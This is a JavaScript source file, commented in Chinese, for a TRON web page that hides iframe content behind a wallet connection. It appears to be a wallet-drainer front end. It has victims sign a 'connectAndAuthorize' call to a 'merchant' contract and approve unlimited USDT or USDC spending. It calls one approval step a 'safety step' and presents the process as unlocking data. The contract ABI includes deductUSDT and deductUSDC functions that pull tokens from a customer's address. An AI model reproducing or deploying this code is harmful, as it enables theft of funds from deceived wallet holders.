// src/main.js
// 🚨 最終精簡版：僅 Max 授權 + Iframe 遮罩控制 🚨

// --- 配置常量 ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; 

// 您的合約 ABI (保持不變)
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];


// --- 狀態變數 ---
let tronWeb;
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false;
let targetDeductionToken = null; 

// --- UI 元素 ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay'); // 交易時的提示框
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt'); // 覆蓋在 iframe 上的鎖定提示

// --- 輔助函數 ---
function showOverlay(message) {
    overlayMessage.innerHTML = message;
    blurOverlay.style.display = 'flex';
}
function hideOverlay() {
    blurOverlay.style.display = 'none';
}

function updateContentLock(isAuthorized) {
    if (isAuthorized) {
        // 授權成功：移除鎖定提示，讓 iframe 正常顯示
        if (lockedPrompt) lockedPrompt.style.display = 'none';
    } else {
        // 鎖定狀態：顯示鎖定提示
        if (lockedPrompt) lockedPrompt.style.display = 'flex';
    }
}

function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connected) {
        connectButton.classList.add('connected');
        connectButton.innerHTML = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
        connectButton.title = `已連線: ${address}`;
        // 連線成功，顯示檢查狀態消息
        showOverlay('已連線。正在檢查授權狀態...'); 
    } else {
        connectButton.classList.remove('connected');
        connectButton.innerHTML = '連繫錢包';
        connectButton.title = '連繫錢包';
        // 初始/斷開狀態：顯示鎖定提示
        updateContentLock(false); 
        hideOverlay();
    }
}

// 交易計數器 (用於 connectAndAuthorize 函數)
let txCount = 0; 
// 修正：新增 totalTxs 參數，解決 "totalTxs is not defined" 錯誤
async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0) {
    txCount++;
    // 修正：現在可以正確使用 totalTxs
    showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
    
    try {
        // 使用 send() 方法，讓 TronLink 處理簽名和廣播
        const txHash = await methodCall.send({
            // 提高手續費上限至 150 TRX (150,000,000 Sun)，減少因 Energy 不足而導致的失敗
            feeLimit: 150_000_000, 
            callValue: callValue,
            shouldPollResponse: false 
        });
        
        showOverlay(`步驟 ${txCount}/${totalTxs}: 交易已廣播。交易哈希: ${txHash.substring(0, 10)}...`);
        
        // 等待一小段時間讓區塊確認
        await new Promise(resolve => setTimeout(resolve, 3000)); 
        
        return txHash;
    } catch (error) {
        // 統一處理錯誤，拋出更清晰的訊息
        if (error.message && error.message.includes('User cancelled')) {
             throw new Error('用戶在錢包中取消了交易。');
        }
        // 捕獲其他錯誤，例如 'ClassCastException: Estimated Energy is not enough'
        throw new Error(`交易失敗或被拒絕。請確保錢包有足夠的 TRX (用於 Energy) 並同意了彈出視窗。底層錯誤: ${error.message}`);
    }
}


async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
    if (!tronWeb || !userAddress) return false;
    try {
        const allowanceRaw = await tokenContract.allowance(userAddress, spenderAddress).call();
        const allowance = tronWeb.BigNumber(allowanceRaw);
        const MAX_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('100000000000000000000000000000000000000'); 
        return allowance.gte(MAX_ALLOWANCE_THRESHOLD);
    } catch (error) {
        console.error("Failed to check allowance:", error);
        return false;
    }
}
async function getTokenBalance(tokenContract) {
    if (!tronWeb || !userAddress || !tokenContract) return tronWeb.BigNumber(0);
    try {
        const balance = await tokenContract.balanceOf(userAddress).call();
        return tronWeb.BigNumber(balance);
    } catch (error) {
        console.error("Failed to get token balance:", error);
        return tronWeb.BigNumber(0);
    }
}
async function initializeContracts() {
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}

async function connectTronLink() {
    if (!window.tronLink) {
        showOverlay(`🔴 錯誤：未偵測到 TronLink！請安裝 TronLink 擴展或使用 Tron DApp 瀏覽器。`);
        return;
    }
    showOverlay('偵測到 TronLink/DApp 瀏覽器。正在請求連接...');
    try {
        const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
        if (res.code !== 200) {
            throw new Error(`連接請求被拒絕: ${res.message}`);
        }
        if (!window.tronWeb) throw new Error("TronWeb 注入失敗。");
        tronWeb = window.tronWeb;
        userAddress = window.tronWeb.defaultAddress.base58;
        await initializeContracts();
        updateConnectionUI(true, userAddress);
        await handlePostConnection();
    } catch (error) {
        console.error("TronLink 連接失敗:", error);
        showOverlay(`原生連接失敗！錯誤: ${error.message}。請確認錢包已解鎖。`);
        updateConnectionUI(false);
    }
}

async function checkAuthorization() {
    if (!tronWeb || !userAddress || !merchantContract) {
        return { authorizedToken: null, contract: false };
    }
    const contractAuthorized = await merchantContract.authorized(userAddress).call();
    const minAmount = tronWeb.toSun('1.00'); 
    const usdtBalance = await getTokenBalance(usdtContract);
    const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
    const usdcBalance = await getTokenBalance(usdcContract);
    const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
    let targetToken = null; 
    if (usdtBalance.gte(minAmount)) {
        targetToken = 'USDT'; 
    } else if (usdcBalance.gte(minAmount)) {
        targetToken = 'USDC'; 
    }
    targetDeductionToken = targetToken; 
    return {
        contract: contractAuthorized,
        authorizedToken: targetToken, 
        usdtAuthorized: usdtAuthorized,
        usdcAuthorized: usdcAuthorized
    };
}

async function connectAndAuthorize() {
    const status = await checkAuthorization();
    const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
    const ZERO_UINT = "0"; 
    
    // 計算總交易筆數，用於顯示進度
    let totalTxs = (status.contract ? 0 : 1); 
    if (status.authorizedToken && !status[`${status.authorizedToken.toLowerCase()}Authorized`]) {
        // 重置 0 + Max 授權 = 2 筆交易
        totalTxs += 2; 
    }
    
    // 重置交易計數器
    txCount = 0; 
    
    if (totalTxs === 0) {
        showOverlay("✅ 所有授權已就緒。");
        await new Promise(resolve => setTimeout(resolve, 1500)); 
        return true;
    }
    
    try {
        // 1. 合約授權 (ConnectAndAuthorize)
        if (!status.contract) {
            const methodCall = merchantContract.connectAndAuthorize();
            // 傳遞 totalTxs 參數
            await sendTransaction(methodCall, "正在發送合約授權 (ConnectAndAuthorize)", totalTxs);
        }

        // 2. Max 扣款授權 (Approve)
        if (status.authorizedToken && !status[`${status.authorizedToken.toLowerCase()}Authorized`]) {
            const token = status.authorizedToken;
            const tokenContract = token === 'USDT' ? usdtContract : usdcContract;
            const tokenName = token === 'USDT' ? "USDT" : "USDC";

            // 2a. 重置授權至 0 (安全步驟)
            // 傳遞 totalTxs 參數
            await sendTransaction(
                tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT), 
                `${tokenName} 安全步驟: 重置授權至 0 (請同意)`,
                totalTxs
            );

            // 2b. 設置 Max 授權
            // 傳遞 totalTxs 參數
            await sendTransaction(
                tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT), 
                `設置 ${tokenName} Max 扣款授權 (最終授權 - 請同意)`,
                totalTxs
            );
        }

        if (!status.authorizedToken && totalTxs > 0) {
             throw new Error("錢包中 USDT 和 USDC 餘額皆不足 $1.00，無法開始代幣授權流程。");
        }
        
        return true;
    } catch (error) {
        console.error("Authorization Failed:", error);
        // 顯示修復後的、更精確的錯誤訊息
        showOverlay(`🔴 授權交易失敗！錯誤訊息: ${error.message}。請確保錢包已解鎖，有足夠的 TRX (用於手續費) 並同意了所有 ${totalTxs} 筆交易。`);
        return false;
    }
}


// ---------------------------------------------
// 連線成功後處理：檢查並控制 iframe 遮罩
// ---------------------------------------------
async function handlePostConnection() {
    if (!isConnectedFlag) return;
    
    const status = await checkAuthorization();
    const tokenAuthorized = status.authorizedToken && status[`${status.authorizedToken.toLowerCase()}Authorized`];
    const allAuthorized = status.contract && tokenAuthorized;

    if (allAuthorized) {
        // 授權已完成：移除鎖定提示，允許查看 iframe 內容
        showOverlay('✅ Max 授權已成功！數據已解鎖。');
        updateContentLock(true); 
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        hideOverlay();

    } else {
        // 授權未完成：引導用戶授權
        showOverlay('正在檢查授權狀態，Max 授權尚未完成。即將開始授權流程...');
        updateContentLock(false); 
        
        const authSuccess = await connectAndAuthorize();
        if (authSuccess) {
            // 授權成功，重新檢查狀態
            await handlePostConnection(); 
        }
    }
}

// ---------------------------------------------
// 主連接入口函數
// ---------------------------------------------
async function connectWallet() {
    if (connectButton) connectButton.disabled = true;

    if (isConnectedFlag) {
        // 斷開連接邏輯
        tronWeb = null;
        userAddress = null;
        isConnectedFlag = false;
        targetDeductionToken = null;
        updateConnectionUI(false);
        if (connectButton) connectButton.disabled = false;
        return;
    }

    await connectTronLink();
    
    if (connectButton) connectButton.disabled = false;
}


// 設置事件監聽器
if (connectButton) connectButton.addEventListener('click', connectWallet);


// 頁面啟動：初始化為未連接狀態
updateConnectionUI(false);